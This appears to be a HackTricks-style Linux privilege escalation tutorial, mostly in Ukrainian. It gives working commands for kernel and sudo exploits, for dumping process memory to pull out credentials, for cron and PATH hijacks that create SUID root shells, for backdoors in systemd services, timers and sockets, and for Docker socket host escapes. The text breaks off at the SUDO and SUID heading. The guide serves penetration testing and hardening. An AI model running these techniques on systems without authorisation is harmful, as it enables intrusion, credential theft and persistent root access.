# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### Інформація про ОС

Почнемо з отримання інформації про запущену ОС.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-якій папці всередині змінної `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Env info

Цікава інформація, паролі чи API-ключі у змінних оточення?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel та чи існує якийсь exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі версії вразливих kernel з цього сайту, ви можете зробити так:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконувати IN victim, перевіряє лише exploits для kernel 2.x)

Завжди **search the kernel version in Google**, можливо ваш kernel version вказаний у якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі вразливих версій sudo, що наведені в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використавши цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg перевірка підпису не пройшла

Перевірте **smasher2 box of HTB** для **прикладу** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви всередині docker container, ви можете спробувати вирватися з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати це і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічити корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендовано компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендується вручну перевіряти версію більш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки на застаріле та вразливе програмне забезпечення, встановлене на цій машині.

> [!NOTE] > _Зауважте, що ці команди покажуть багато інформації, яка переважно буде марною, тому рекомендовано використовувати такі додатки як OpenVAS або подібні, які перевіряють, чи будь-яка встановлена версія ПЗ вразлива до відомих exploits_

## Процеси

Перегляньте, **які процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (наприклад, tomcat, що запускається від імені root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**], їх можна використати для підвищення привілеїв (electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів**, можливо, ви зможете перезаписати якийсь.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, що виконуються часто або коли виконані певні умови.

### Пам'ять процесу

Деякі сервіси на сервері зберігають **credentials у відкритому вигляді в пам'яті**.\
Зазвичай вам потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти ще credentials.\
Проте пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, якими володієте**.

> [!WARNING]
> Зверніть увагу, що сьогодні більшість машин **за замовчуванням не дозволяють ptrace**, що означає, що ви не можете дампити інші процеси, які належать непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можуть бути відлагоджені, якщо вони мають той самий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: можна відлагоджувати лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: лише адмін може використовувати ptrace, оскільки це вимагає capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жодні процеси не можуть бути трасовані ptrace. Після встановлення потрібно перезавантажити систему, щоб знову ввімкнути ptrace.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показують, як пам'ять відображається в межах цього процесу** віртуального адресного простору; вони також показують **права доступу для кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **seek into the mem file and dump all readable regions** to a file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише для **root** та групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це реалізація для Linux класичного інструмента ProcDump із набору інструментів Sysinternals для Windows. Отримати можна за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб здампити пам'ять процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і здампити процес, який належить вам
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (вимагається root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущено:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете зробити dump процесу (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Для коректної роботи вимагає привілеїв root.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошук регулярних виразів/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

Перевірте, чи якісь заплановані завдання вразливі. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? можна змінити файли, які використовує root? використати symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт, не встановивши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт виконується від імені root і має “**\***” всередині команди, ви можете експлуатувати це, щоб виконати непередбачувані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху, наприклад** _**/some/path/\***_ **, це не вразливе (навіть** _**./\***_ **ні).**

Прочитайте наступну сторінку для додаткових трюків з експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Перезапис Cron script і symlink

Якщо ви **можете змінити cron script**, який виконується від імені root, ви можете дуже легко отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, який виконується під root, використовує **directory, де у вас є full access**, можливо, варто видалити цю folder і **створити symlink folder на іншу**, що містить script, контрольований вами
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете відстежувати процеси, щоб шукати процеси, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, щоб **відстежувати кожні 0.1s протягом 1 minute**, **відсортувати за найменш виконуваними командами** та видалити команди, які виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежуватиме та перелічуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **вставивши carriage return після коментаря** (без символу newline), і cronjob працюватиме. Приклад (зверніть увагу на символ carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записувати будь-який `.service` файл; якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor**, коли сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться чекати, поки машина не перезавантажиться).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису** на binaries, які виконуються сервісами, ви можете замінити їх на backdoors — тоді при повторному запуску сервісів backdoors буде виконано.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь-яку з папок цього шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати **relative paths being used on service configurations** у конфігураційних файлах сервісів, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з **тим же ім'ям, що і relative path binary**, у папці PATH systemd, до якої ви маєте права на запис, і коли сервіс попросять виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти сервіси, але перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про сервіси за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit файли, чиє ім'я закінчується на `**.timer**`, які контролюють `**.service**` файли або події. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій за календарним часом і монотоничних часових подій та можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Юніт, який активується, коли цей таймер спливає. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає сервісу, який має те ж саме ім'я, що й таймер-юнит, за винятком суфікса. (Див. вище.) Рекомендується, щоб ім'я unit, який активується, і ім'я таймер-юнита мали однакові назви, за винятком суфікса.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує записуваний бінарний файл**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права на запис** у **systemd PATH** (щоб видавати себе за цей виконуваний файл)

**Дізнайтесь більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні привілеї root і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зауважте, що **timer** **активується** шляхом створення символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **комунікацію процесів** на тій самій або на різних машинах у клієнт-серверних моделях. Вони використовують стандартні Unix дескриптори файлів для міжкомп'ютерної комунікації і налаштовуються через `.socket` файли.

Сокети можна конфігурувати за допомогою `.socket` файлів.

**Дізнайтеся більше про сокети з `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різні, але коротко використовуються для **вказання, де буде прослуховуватися** сокет (шлях до AF_UNIX socket файлу, IPv4/6 і/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання породжується окрема **service instance** і їй передається тільки сокет з'єднання. Якщо **false**, усі прослуховуючі сокети самі **передаються до запущеної service unit**, і для всіх з'єднань створюється тільки одна service unit. Це значення ігнорується для datagram сокетів та FIFO, де одна service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендовано писати нові демони таким чином, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або декілька командних рядків, які **виконуються до** або **після** створення та прив'язки прослуховуючих **sockets**/FIFO відповідно. Першим токеном командного рядка має бути абсолютне ім'я файлу, далі — аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення прослуховуючих **sockets**/FIFO відповідно.
- `Service`: Вказує ім'я **service** unit, який потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена тільки для сокетів з Accept=no. За замовчуванням використовується service з тією ж назвою, що й сокет (із заміненим суфіксом). У більшості випадків застосовувати цю опцію не потрібно.

### Записувані `.socket` файли

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому, **ймовірно, вам доведеться зачекати до перезавантаження машини.**\ _Зауважте, що система має використовувати цю конфігурацію socket файлу, інакше backdoor не буде виконано_

### Доступні для запису сокети

Якщо ви **виявите будь-який записуваний сокет** (_тут йдеться про Unix Sockets, а не про конфігураційні `.socket` файли_), тоді **ви можете спілкуватися** з цим сокетом і, можливо, exploit a vulnerability.

### Перерахування Unix сокетів
```bash
netstat -a -p --unix
```
### Пряме з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть існувати деякі **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо socket **відповідає на HTTP-запит**, то ви можете **спілкуватися** з ним і, можливо, **експлуатувати якусь вразливість**.

### Docker socket, доступний для запису

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Наявність прав запису до цього socket може призвести до privilege escalation. Нижче наведено розбір того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation за допомогою Docker CLI**

Якщо у вас є права запису до Docker socket, ви можете escalate privileges, використавши наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Using Docker API Directly**

У випадках, коли Docker CLI недоступний, docker socket все ще можна маніпулювати за допомогою Docker API і `curl` команд.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надіслати запит на створення контейнера, який монтує кореневий каталог хост-системи.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat`, щоб встановити з'єднання з контейнером і виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання через `socat` ви можете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Others

Зауважте, що якщо у вас є права запису до docker socket тому що ви **inside the group `docker`** — у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from docker or abuse it to escalate privileges** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної взаємодії (IPC), що дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасної Linux-системи, вона пропонує надійну платформу для різних форм комунікації між додатками.

Система є універсальною, підтримуючи базовий IPC, що полегшує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає у трансляції подій або сигналів, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth демона про вхідний дзвінок може змусити музичний плеєр приглушити звук, покращуючи взаємодію з користувачем. Також D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного ефекту правил політики, що збігаються. Ці політики визначають взаємодії з bus, що потенційно може дозволити ескалацію привілеїв через експлуатацію цих дозволів.

Приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче, який деталізує дозволи для користувача root на володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики з контекстом "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся тут, як enumerate і exploit комунікацію D-Bus:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу й визначити розташування машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Завжди перевіряйте network services, які працюють на машині і з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви можете здобути деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна енумерація

Перевірте, хто ви, які у вас **привілеї**, які **користувачі** є в системі, хто може **увійти** і хто має **root-привілеї**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Деякі версії Linux були вражені багом, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) та [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатуйте** за допомогою: **`systemd-run -t /bin/bash`**

### Groups

Перевірте, чи є ви **членом якоїсь групи**, яка може надати вам права root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Перевірте, чи є всередині буфера обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** серед середовища, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вас не лякає велика кількість шуму і бінарники `su` та `timeout` присутні на машині, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваним $PATH

### $PATH

Якщо ви виявите, що можете **записувати всередину якоїсь теки з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній теці** з ім’ям якоїсь команди, яка виконуватиметься іншим користувачем (ideally root), і яка **не завантажується з теки, що розташована перед** вашою записуваною текою в $PATH.

### SUDO and SUID

